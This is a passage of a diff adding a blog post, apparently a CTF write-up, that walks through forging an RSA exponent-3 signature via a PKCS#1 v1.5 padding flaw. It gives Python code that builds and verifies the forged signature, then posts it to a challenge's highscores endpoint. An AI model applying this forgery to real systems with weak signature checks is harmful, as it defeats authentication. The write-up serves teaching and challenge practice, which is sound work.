+</span><span>	</span><span style="color:#ca7473;">if </span><span style="color:#b678a9;">get_bit</span><span>(sig_suffix </span><span style="color:#ca7473;">** </span><span style="color:#6facbe;">3</span><span>, b) </span><span style="color:#ca7473;">!= </span><span style="color:#b678a9;">get_bit</span><span>(</span><span style="color:#b678a9;">from_bytes</span><span>(target_suffix), b):
+</span><span>	    sig_suffix </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">set_bit</span><span>(sig_suffix, b, </span><span style="color:#6facbe;">1</span><span>)
+</span><span>    </span><span style="color:#ca7473;">return </span><span>sig_suffix
+</span></code></pre>
+<p>As for obtaining the prefix, I simply cube root the prefix and check if it cubes back to the correct prefix. As long as that doesn't work, I keep adding garbage (FF and 00 bytes) to the end, thus &quot;pushing&quot; the error away from my payload. After a while, I find something that cubes back to a number that begins with my intended prefix, and ends with a bunch of garbage.</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span>sig_prefix </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">cube_root</span><span>(</span><span style="color:#b678a9;">from_bytes</span><span>(target_prefix </span><span style="color:#ca7473;">+ </span><span>b</span><span style="color:#c59c70;">&#39;</span><span style="color:#64be81;">\xff</span><span style="color:#c59c70;">&#39; </span><span style="color:#ca7473;">* </span><span style="color:#6facbe;">34 </span><span style="color:#ca7473;">+ </span><span>b</span><span style="color:#c59c70;">&#39;</span><span style="color:#64be81;">\x00</span><span style="color:#c59c70;">&#39; </span><span style="color:#ca7473;">* </span><span style="color:#6facbe;">30</span><span>))
+</span><span style="color:#6a6a6a;"># print(sig_prefix ** 3)
+</span></code></pre>
+<p>So, how can we tie these two together?
+We can have garbage between our prefix and suffix, hidden in the DER sequence. Since DER sequences start with declaring their length, the easiest way to get those correct is to use python to generate our payload</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ca7473;">def sign</span><span>(</span><span style="color:#c59c70;">i</span><span>):
+</span><span>     digest_algorithm_identifier </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">DerSequence</span><span>([
+</span><span>	</span><span style="color:#b678a9;">DerObjectId</span><span>(</span><span style="color:#c59c70;">&#39;2.16.840.1.101.3.4.2.1&#39;</span><span>).</span><span style="color:#b678a9;">encode</span><span>(),
+</span><span>	</span><span style="color:#b678a9;">DerNull</span><span>().</span><span style="color:#b678a9;">encode</span><span>(),
+</span><span>	</span><span style="color:#b678a9;">DerOctetString</span><span>(b</span><span style="color:#c59c70;">&#39;</span><span style="color:#64be81;">\x01</span><span style="color:#c59c70;">&#39;</span><span style="color:#ca7473;">*</span><span>(i)) </span><span style="color:#6a6a6a;"># This is our garbage, we can replace this with anything
+</span><span>     ])
+</span><span>
+</span><span>     digest </span><span style="color:#ca7473;">= </span><span>hashlib.</span><span style="color:#b678a9;">sha256</span><span>(json.</span><span style="color:#b678a9;">dumps</span><span>([</span><span style="color:#c59c70;">&quot;pzero-adventures&quot;</span><span>, </span><span style="color:#c59c70;">&quot;hur&quot;</span><span>, </span><span style="color:#ca7473;">-</span><span style="color:#6facbe;">2</span><span>]).</span><span style="color:#b678a9;">encode</span><span>()).</span><span style="color:#b678a9;">digest</span><span>()
+</span><span>
+</span><span>     digest_info </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">DerSequence</span><span>(([
+</span><span>	digest_algorithm_identifier,
+</span><span>	</span><span style="color:#b678a9;">DerOctetString</span><span>(digest).</span><span style="color:#b678a9;">encode</span><span>(),
+</span><span>     ])).</span><span style="color:#b678a9;">encode</span><span>()
+</span><span>          
+</span><span>     </span><span style="color:#ca7473;">return </span><span>digest_info
+</span></code></pre>
+<p>Now, we find the target prefix of our payload. I use sign() with varying inputs so that the generated payload + the padding bytes at the beginning sum to 256 bytes.</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span>target </span><span style="color:#ca7473;">= </span><span>b</span><span style="color:#c59c70;">&#39;</span><span style="color:#64be81;">\x00\x01</span><span style="color:#c59c70;">&#39; </span><span style="color:#ca7473;">+ </span><span>b</span><span style="color:#c59c70;">&#39;</span><span style="color:#64be81;">\xff</span><span style="color:#c59c70;">&#39;</span><span style="color:#ca7473;">*</span><span style="color:#6facbe;">8 </span><span style="color:#ca7473;">+ </span><span>b</span><span style="color:#c59c70;">&#39;</span><span style="color:#64be81;">\x00</span><span style="color:#c59c70;">&#39; </span><span style="color:#ca7473;">+ </span><span style="color:#b678a9;">sign</span><span>(</span><span style="color:#6facbe;">189</span><span>)
+</span></code></pre>
+<p>From target, we take the bytes up to header of our garbage DerOctetString, but not its payload. This way, we have the correct lengths defined in our payload, and we are free to fill it with garbage.</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span>target_prefix </span><span style="color:#ca7473;">= </span><span>b</span><span style="color:#c59c70;">&#39;</span><span style="color:#64be81;">\x00\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00</span><span style="color:#c59c70;">0</span><span style="color:#64be81;">\x81\xf2</span><span style="color:#c59c70;">0</span><span style="color:#64be81;">\x81\xcd\x06\t</span><span style="color:#c59c70;">`</span><span style="color:#64be81;">\x86</span><span style="color:#c59c70;">H</span><span style="color:#64be81;">\x01</span><span style="color:#c59c70;">e</span><span style="color:#64be81;">\x03\x04\x02\x01\x05\x00\x04\x81\xbd</span><span style="color:#c59c70;">&#39;
+</span><span>sig_prefix </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">cube_root</span><span>(</span><span style="color:#b678a9;">from_bytes</span><span>(target_prefix </span><span style="color:#ca7473;">+ </span><span>b</span><span style="color:#c59c70;">&#39;</span><span style="color:#64be81;">\xff</span><span style="color:#c59c70;">&#39; </span><span style="color:#ca7473;">* </span><span style="color:#6facbe;">34 </span><span style="color:#ca7473;">+ </span><span>b</span><span style="color:#c59c70;">&#39;</span><span style="color:#64be81;">\x00</span><span style="color:#c59c70;">&#39; </span><span style="color:#ca7473;">* </span><span style="color:#6facbe;">30</span><span>))
+</span></code></pre>
+<p>The suffix is simpler, the target suffix is the DerOctetString of our message's sha256 digest.</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span>target_suffix </span><span style="color:#ca7473;">= </span><span>b</span><span style="color:#c59c70;">&#39;</span><span style="color:#64be81;">\x04 \x14\xd4\x88</span><span style="color:#c59c70;">o</span><span style="color:#64be81;">\x84\xa2\xa7</span><span style="color:#c59c70;">8ge</span><span style="color:#64be81;">\xbf\x7f\x88\xfe\x18\xac\xcc\x13</span><span style="color:#c59c70;">5</span><span style="color:#64be81;">\x1e\x08\xe1</span><span style="color:#c59c70;">.</span><span style="color:#64be81;">\xf6</span><span style="color:#c59c70;">ce</span><span style="color:#64be81;">\xe0\xa7\t</span><span style="color:#c59c70;">TR</span><span style="color:#64be81;">\xf1</span><span style="color:#c59c70;">&#39;
+</span><span>sig_suffix </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">gen_suffix</span><span>(target_suffix)
+</span><span>suffix </span><span style="color:#ca7473;">= </span><span style="color:#b678a9;">to_bytes</span><span>(sig_suffix)
+</span></code></pre>
+<p>Now, we can concatenate them, with our garbage in between, and pad it with zeroes to fill the signature up to the required length. I simply play around with this until I get something that gets cubed such that our payload starts at the right offset. That is, when RSA decryption (cubing our input) is done, our we expect that <code>len(payload) == 256</code>, and <code>payload[0] = b'\x01'</code>, and so on...</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#6a6a6a;"># play around with i until we get something that is of right order of magnitude
+</span><span>i </span><span style="color:#ca7473;">= </span><span style="color:#6facbe;">171
+</span><span>bad </span><span style="color:#ca7473;">= </span><span>b</span><span style="color:#c59c70;">&#39;</span><span style="color:#64be81;">\x00</span><span style="color:#c59c70;">&#39; </span><span style="color:#ca7473;">* </span><span>i </span><span style="color:#ca7473;">+ </span><span>b</span><span style="color:#c59c70;">&#39;2</span><span style="color:#64be81;">\xcb\xfd</span><span style="color:#c59c70;">Jz</span><span style="color:#64be81;">\xdc</span><span style="color:#c59c70;">y</span><span style="color:#64be81;">\x05</span><span style="color:#c59c70;">X=y </span><span style="color:#64be81;">\xd7\x16</span><span style="color:#c59c70;">]w</span><span style="color:#64be81;">\xcf\x8d</span><span style="color:#c59c70;">oK</span><span style="color:#64be81;">\x19\xa4\xc1</span><span style="color:#c59c70;">@&amp;</span><span style="color:#64be81;">\xdc\x9b\xf5</span><span style="color:#c59c70;">Wk-</span><span style="color:#64be81;">\xeb</span><span style="color:#c59c70;">&#39;
+</span><span>bad </span><span style="color:#ca7473;">+= </span><span>b</span><span style="color:#c59c70;">&#39;</span><span style="color:#64be81;">\x01</span><span style="color:#c59c70;">&#39; </span><span style="color:#ca7473;">* </span><span>((</span><span style="color:#6facbe;">195 </span><span style="color:#ca7473;">- </span><span style="color:#6facbe;">5 </span><span style="color:#ca7473;">- </span><span>i)) </span><span style="color:#ca7473;">+ </span><span>b</span><span style="color:#c59c70;">&#39;t=</span><span style="color:#64be81;">\xd3</span><span style="color:#c59c70;">b#</span><span style="color:#64be81;">\x98\xd1</span><span style="color:#c59c70;">P</span><span style="color:#64be81;">\x14 \xba\x84\xd0</span><span style="color:#c59c70;">3</span><span style="color:#64be81;">\xcc\xb6</span><span style="color:#c59c70;">#</span><span style="color:#64be81;">\xdd</span><span style="color:#c59c70;">G</span><span style="color:#64be81;">\xb8</span><span style="color:#c59c70;">Ra</span><span style="color:#64be81;">\xbe</span><span style="color:#c59c70;">0</span><span style="color:#64be81;">\xa1\x83</span><span style="color:#c59c70;">*&gt;v</span><span style="color:#64be81;">\xc5\xd5\xde\x9d</span><span style="color:#c59c70;">Q&#39;
+</span></code></pre>
+<p>I used something like the following to test the validity of my payload.</p>
+<pre data-lang="python" style="background-color:#181818;color:#c4c4c4;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ca7473;">assert </span><span style="color:#6facbe;">len</span><span>(bad) </span><span style="color:#ca7473;">== </span><span style="color:#6facbe;">256
+</span><span style="color:#ca7473;">import </span><span>binascii
+</span><span style="color:#6facbe;">input </span><span style="color:#ca7473;">= </span><span>binascii.</span><span style="color:#b678a9;">hexlify</span><span>(bad).</span><span style="color:#b678a9;">decode</span><span>()
+</span><span>
+</span><span>s </span><span style="color:#ca7473;">= </span><span style="color:#c1bb71;">bytes</span><span>.</span><span style="color:#b678a9;">fromhex</span><span>(</span><span style="color:#6facbe;">input</span><span>)
+</span><span>s </span><span style="color:#ca7473;">= </span><span style="color:#c1bb71;">int</span><span>.</span><span style="color:#b678a9;">from_bytes</span><span>(s, </span><span style="color:#c59c70;">&#39;big&#39;</span><span>)
+</span><span style="color:#ca7473;">assert </span><span>s</span><span style="color:#ca7473;">**</span><span style="color:#6facbe;">3 </span><span style="color:#ca7473;">&lt; </span><span>n
+</span><span>k </span><span style="color:#ca7473;">= </span><span style="color:#6facbe;">pow</span><span>(s, </span><span style="color:#6facbe;">3</span><span>, n)
+</span><span>k </span><span style="color:#ca7473;">= </span><span style="color:#c1bb71;">int</span><span>.</span><span style="color:#b678a9;">to_bytes</span><span>(k, </span><span style="color:#6facbe;">2048</span><span style="color:#ca7473;">//</span><span style="color:#6facbe;">8</span><span>, </span><span style="color:#c59c70;">&#39;big&#39;</span><span>)
+</span><span style="color:#6facbe;">print</span><span>(</span><span style="color:#b678a9;">verify</span><span>(k)) </span><span style="color:#6a6a6a;"># test with the function used in the remote server to make sure the payload works.
+</span></code></pre>
+<p>After forging the signature, the flag is obtained by posting the name, score and signature to the highscores endpoint. </p>
+<h2 id="ep005ch03">EP005CH03</h2>
+<p>During the &quot;HACKING GOOGLE&quot; logo flash in the videos, morse code can be heard in the background. Decoding the morse code gives the flag.</p>
+
+    </div>
+
+    
+        <footer>
+            <hr>
+            <p>
+                
+                    Published by Atte Niemi
+                
+                
+                    
+                    in <a href="https://www.atteniemi.com/categories/security/">security</a>
+                
+                
+            </p>
+            
+            
+        </footer>
+    
+</article>
+
+
+    </body>
+
+</html>
+
